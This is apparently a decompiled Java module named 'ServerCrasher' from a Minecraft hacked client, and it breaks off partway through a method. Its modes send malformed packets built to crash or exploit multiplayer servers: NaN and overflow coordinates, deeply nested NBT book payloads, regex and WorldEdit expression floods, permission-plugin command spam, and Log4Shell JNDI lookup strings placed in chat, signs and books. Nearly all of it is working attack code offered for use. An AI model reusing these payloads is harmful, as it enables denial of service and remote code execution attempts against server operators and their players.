/*     */ package awareline.main.mod.implement.misc.server;
/*     */ import awareline.main.event.EventHandler;
/*     */ import awareline.main.event.events.LBEvents.EventWorldChanged;
/*     */ import awareline.main.event.events.world.updateEvents.EventPreUpdate;
/*     */ import awareline.main.mod.implement.world.utils.breaktimer.TimerUtil;
/*     */ import awareline.main.mod.values.Mode;
/*     */ import awareline.main.mod.values.Numbers;
/*     */ import awareline.main.mod.values.Value;
/*     */ import io.netty.buffer.Unpooled;
/*     */ import java.util.Random;
/*     */ import net.minecraft.block.Block;
/*     */ import net.minecraft.init.Items;
/*     */ import net.minecraft.item.ItemStack;
/*     */ import net.minecraft.nbt.NBTBase;
/*     */ import net.minecraft.nbt.NBTTagCompound;
/*     */ import net.minecraft.nbt.NBTTagList;
/*     */ import net.minecraft.nbt.NBTTagString;
/*     */ import net.minecraft.network.Packet;
/*     */ import net.minecraft.network.PacketBuffer;
/*     */ import net.minecraft.network.play.client.C03PacketPlayer;
/*     */ import net.minecraft.network.play.client.C07PacketPlayerDigging;
/*     */ import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
/*     */ import net.minecraft.network.play.client.C09PacketHeldItemChange;
/*     */ import net.minecraft.network.play.client.C0EPacketClickWindow;
/*     */ import net.minecraft.network.play.client.C17PacketCustomPayload;
/*     */ import net.minecraft.util.BlockPos;
/*     */ import net.minecraft.util.ChatComponentText;
/*     */ import net.minecraft.util.EnumFacing;
/*     */ import net.minecraft.util.IChatComponent;
/*     */ import org.apache.commons.lang3.RandomStringUtils;
/*     */ import org.apache.commons.lang3.RandomUtils;
/*     */ 
/*     */ public class ServerCrasher extends Module {
/*  34 */   public final Numbers<Double> delayy = new Numbers("Delay", Double.valueOf(300.0D), Double.valueOf(0.0D), Double.valueOf(10000.0D), Double.valueOf(1.0D));
/*  35 */   private final Mode<String> mode = new Mode("Mode", new String[] { "FAWE", "Packet", "Multiverse", "Log4J", "InvalidMove", "Payload", "Mare", "Switch", "Pex", "AACCommand", "AAC5", "Interact", "BlockClick", "Book", "Rotation", "Window", "Mare", "Chunk" }, "Packet");
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*  41 */   private final TimerUtil delay = new TimerUtil();
/*     */   
/*     */   public ServerCrasher() {
/*  44 */     super("ServerCrasher", new String[] { "crasher", "crash" }, ModuleType.Misc);
/*  45 */     addSettings(new Value[] { (Value)this.mode, (Value)this.delayy });
/*     */   }
/*     */ 
/*     */   
/*     */   public void onEnable() {
/*  50 */     this.delay.reset();
/*  51 */     super.onEnable();
/*     */   }
/*     */ 
/*     */   
/*     */   public void onDisable() {
/*  56 */     this.delay.reset();
/*  57 */     super.onDisable();
/*     */   }
/*     */   
/*     */   @EventHandler(0)
/*     */   public void onWorldChange(EventWorldChanged event) {
/*  62 */     checkModule(ServerCrasher.class);
/*     */   }
/*     */   
/*     */   @EventHandler(0)
/*     */   public void onTick(EventTick event) {
/*  67 */     if (mc.thePlayer == null || mc.theWorld == null || !mc.thePlayer.isEntityAlive() || mc.thePlayer.ticksExisted <= 1) {
/*  68 */       setEnabled(false);
/*     */     }
/*     */   }
/*     */   
/*     */   @EventHandler(1)
/*     */   private void onMotion(EventPreUpdate e) {
/*  74 */     setSuffix((Serializable)this.mode.getValue());
/*  75 */     if (this.mode.is("Switch")) {
/*  76 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/*  77 */         int i; for (i = 0; i < 16; i++) {
/*  78 */           sendPacketNoEvent((Packet)new C09PacketHeldItemChange("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^".length()));
/*     */         }
/*  80 */         sendPacketNoEvent((Packet)new C03PacketPlayer.C05PacketPlayerLook(9.223372E18F, 9.223372E18F, e.isOnGround()));
/*  81 */         for (i = 0; i < 16; i++) {
/*  82 */           sendPacketNoEvent((Packet)new C09PacketHeldItemChange("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}".length()));
/*     */         }
/*  84 */         this.delay.reset();
/*     */       } 
/*  86 */     } else if (this.mode.is("Mare")) {
/*  87 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/*  88 */         NBTTagCompound tag = new NBTTagCompound();
/*  89 */         NBTTagList list = new NBTTagList();
/*  90 */         StringBuilder value = (new StringBuilder()).append("{");
/*  91 */         int amount = 833;
/*     */         
/*     */         int i2;
/*  94 */         for (i2 = 0; i2 < 833; i2++) {
/*  95 */           value.append("extra:[{");
/*     */         }
/*     */         
/*  98 */         for (i2 = 0; i2 < 833; i2++) {
/*  99 */           value.append("text:⾟}],");
/*     */         }
/*     */         
/* 102 */         value.append("text:⾟}");
/* 103 */         list.appendTag((NBTBase)new NBTTagString(value.toString()));
/* 104 */         tag.setTag("pages", (NBTBase)list);
/* 105 */         ItemStack book = new ItemStack(Items.writable_book);
/* 106 */         book.setTagCompound(tag);
/* 107 */         sendPacketNoEvent((Packet)new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ), 2, book, 0.0F, 0.0F, 0.0F));
/* 108 */         this.delay.reset();
/*     */       } 
/* 110 */     } else if (this.mode.is("AAC5")) {
/* 111 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 112 */         sendPacketNoEvent((Packet)new C03PacketPlayer.C04PacketPlayerPosition(1.7E301D, -999.0D, 0.0D, true));
/* 113 */         this.delay.reset();
/*     */       } 
/* 115 */     } else if (this.mode.is("Interact")) {
/* 116 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 117 */         for (int i = 0; i < 10; i++) {
/* 118 */           sendPacketNoEvent((Packet)new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, new BlockPos(RandomUtils.nextDouble(0.0D, Double.MAX_VALUE), RandomUtils.nextDouble(0.0D, Double.MAX_VALUE), RandomUtils.nextDouble(0.0D, Double.MAX_VALUE)), EnumFacing.UP));
/*     */         }
/* 120 */         this.delay.reset();
/*     */       } 
/* 122 */     } else if (this.mode.is("BlockClick")) {
/* 123 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 124 */         sendPacketNoEvent((Packet)new C0EPacketClickWindow(0, 0, 0, 1, new ItemStack((Block)Blocks.piston_head), (short)0));
/* 125 */         this.delay.reset();
/*     */       } 
/* 127 */     } else if (this.mode.is("Packet")) {
/* 128 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 129 */         sendPacketNoEvent((Packet)new C03PacketPlayer.C06PacketPlayerPosLook(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, e.isOnGround()));
/* 130 */         this.delay.reset();
/*     */       } 
/* 132 */     } else if (this.mode.is("FAWE")) {
/* 133 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 134 */         sendPacketNoEvent((Packet)new C14PacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
/* 135 */         this.delay.reset();
/*     */       } 
/* 137 */     } else if (this.mode.is("Multiverse")) {
/* 138 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 139 */         if (mc.thePlayer.ticksExisted % 20 == 0) {
/* 140 */           mc.thePlayer.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
/*     */         }
/* 142 */         this.delay.reset();
/*     */       } 
/* 144 */     } else if (this.mode.is("Log4J")) {
/* 145 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 146 */         mc.thePlayer.sendChatMessage("/ ${jndi:rmi://localhost:3000}");
/* 147 */         this.delay.reset();
/*     */       } 
/* 149 */     } else if (this.mode.is("InvalidMove")) {
/* 150 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 151 */         sendPacketNoEvent((Packet)new C03PacketPlayer.C06PacketPlayerPosLook(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, e.isOnGround()));
/* 152 */         this.delay.reset();
/*     */       } 
/* 154 */     } else if (this.mode.is("Payload")) {
/* 155 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 156 */         PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
/* 157 */         sendPacketNoEvent((Packet)new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
/* 158 */         this.delay.reset();
/*     */       } 
/* 160 */     } else if (this.mode.is("AACCommand")) {
/* 161 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 162 */         mc.thePlayer.sendChatMessage((new Random()).nextBoolean() ? "/aac:aac" : "/aac");
/* 163 */         this.delay.reset();
/*     */       } 
/* 165 */     } else if (this.mode.is("Sign")) {
/* 166 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 167 */         IChatComponent[] text = { (IChatComponent)new ChatComponentText("${jndi:rmi://localhost:3000}") };
/* 168 */         sendPacketNoEvent((Packet)new C12PacketUpdateSign(BlockPos.ORIGIN, text));
/* 169 */         this.delay.reset();
/*     */       } 
/* 171 */     } else if (this.mode.is("Pex")) {
/* 172 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 173 */         if (mc.thePlayer.ticksExisted % 20 == 0) {
/* 174 */           mc.thePlayer.sendChatMessage("/pex promote a a");
/* 175 */           mc.thePlayer.sendChatMessage("/pex promote b b");
/*     */         } 
/* 177 */         this.delay.reset();
/*     */       } 
/* 179 */     } else if (this.mode.is("Book")) {
/*     */ 
/*     */ 
/*     */ 
/*     */       
/* 184 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 185 */         NBTTagCompound comp = new NBTTagCompound();
/* 186 */         NBTTagList list = new NBTTagList();
/* 187 */         list.appendTag((NBTBase)new NBTTagString("${jndi:rmi://localhost:3000}"));
/* 188 */         comp.setString("author", "${jndi:rmi://localhost:3000}");
/* 189 */         comp.setString("title", "${jndi:rmi://localhost:3000}");
/* 190 */         comp.setByte("resolved", (byte)1);
/* 191 */         comp.setTag("pages", (NBTBase)list);
/* 192 */         ItemStack stack = new ItemStack(Items.writable_book);
/* 193 */         stack.setTagCompound(comp);
/* 194 */         PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
/* 195 */         buffer.writeItemStackToBuffer(stack);
/* 196 */         sendPacketNoEvent((Packet)new C0EPacketClickWindow(0, 0, 0, 1, stack, (short)0));
/* 197 */         this.delay.reset();
/*     */       } 
/* 199 */     } else if (this.mode.is("Rotation")) {
/* 200 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 201 */         sendPacketNoEvent((Packet)new C03PacketPlayer.C05PacketPlayerLook(9.223372E18F, 9.223372E18F, e.onGround));
/* 202 */         this.delay.reset();
/*     */       } 
/* 204 */     } else if (this.mode.is("Window")) {
/*     */ 
/*     */ 
/*     */ 
/*     */       
/* 209 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 210 */         NBTTagCompound nBTTagCompound1 = new NBTTagCompound();
/* 211 */         NBTTagList list = new NBTTagList();
/* 212 */         for (int m = 0; m < 2; m++) {
/* 213 */           list.appendTag((NBTBase)new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
/*     */         }
/* 215 */         nBTTagCompound1.setString("author", RandomStringUtils.random(16, "0123456789"));
/* 216 */         nBTTagCompound1.setString("title", RandomStringUtils.random(16, "0123456789"));
/* 217 */         nBTTagCompound1.setByte("resolved", (byte)1);
/* 218 */         nBTTagCompound1.setTag("pages", (NBTBase)list);
/* 219 */         ItemStack itemStack1 = new ItemStack(Items.writable_book);
/* 220 */         itemStack1.setTagCompound(nBTTagCompound1);
/* 221 */         sendPacketNoEvent((Packet)new C10PacketCreativeInventoryAction(0, itemStack1));
/* 222 */         this.delay.reset();
/*     */       } 
/* 224 */     } else if (this.mode.is("Mare")) {
/* 225 */       if (this.delay.hasReached(((Double)this.delayy.getValue()).intValue())) {
/* 226 */         for (int i = 0; i < 10; i++) {
/* 227 */           NBTTagCompound nBTTagCompound = new NBTTagCompound();
/* 228 */           NBTTagList nBTTagList = new NBTTagList();
/* 229 */           StringBuilder value = (new StringBuilder()).append("{");
/*     */           int i2;
/* 231 */           for (i2 = 0; i2 < 833; i2++) {
/* 232 */             value.append("extra:[{");
/*     */           }
/* 234 */           for (i2 = 0; i2 < 833; i2++) {
/* 235 */             value.append("text:?}],");
/*     */           }
/* 237 */           value.append("text:?}");
/* 238 */           nBTTagList.appendTag((NBTBase)new NBTTagString(value.toString()));
